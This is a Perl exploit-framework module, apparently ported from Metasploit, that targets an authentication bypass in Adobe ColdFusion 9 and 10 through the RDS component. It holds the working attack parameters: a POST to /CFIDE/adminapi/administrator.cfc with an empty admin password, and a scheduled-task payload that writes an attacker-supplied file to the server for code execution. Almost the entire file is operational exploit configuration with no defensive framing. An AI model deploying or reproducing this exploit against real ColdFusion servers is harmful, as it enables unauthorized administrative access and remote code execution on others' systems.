package COLDFUSION::MSF::ColdfusionRds;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "ColdfusionRds";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        Adobe ColdFusion 9.0, 9.0.1, 9.0.2, and 10 allows remote

        attackers to bypass authentication using the RDS component. Due to

        default settings or misconfiguration, its password can be set to an

        empty value. This allows an attacker to create a session via the RDS

        login that can be carried over to the admin web interface even though

        the passwords might be different, and therefore bypassing authentication

        on the admin web interface leading to arbitrary code execution. Tested

        on Windows and Linux with ColdFusion 9.

      ",
  METHOD => "GET",
  MSF_MODULE => "coldfusion_rds",
  PATH => "name=/CFIDE&runtask=__RUNTASK__&timeout=0&action=delete&task=__TASK__&",
  PAYLOAD => "method=login&adminpassword=&rdsPasswordAllowed=1&method=login&adminpassword=&rdsPasswordAllowed=1&TaskName=__TASKNAME__&Start_Date=Nov1&End_Date=&Interval=&ScheduleType=Once&Operation=HTTPRequest&ScheduledURL=__SCHEDULEDURL__&publish=1&publish_file=__FILE_PATH__\\\\__\\\@FILENAME__&adminsubmit=Submit&",
  TITLE => "Adobe ColdFusion 9 Administrative Login Bypass",
  VARIABLES => {
    'CFIDDIR' =>       { DESCRIPTION => "Alternative CFIDE directory", VALUE => "CFIDE" },
    'TASK' =>       { DESCRIPTION => "", VALUE => "" },
    'FILE_PATH' =>       { DESCRIPTION => "", VALUE => "" },
    'RUNTASK' =>       { DESCRIPTION => "", VALUE => "" },
    'SCHEDULEDURL' =>       { DESCRIPTION => "", VALUE => "" },
    'TASKNAME' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'CFIDE/adminapi/administrator.cfc',
      PAYLOAD      => 'method=login&adminpassword=&rdsPasswordAllowed=1',
      TEXT   => 'Sending Exploit #1 Request : [POST] /CFIDE/adminapi/administrator.cfc',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
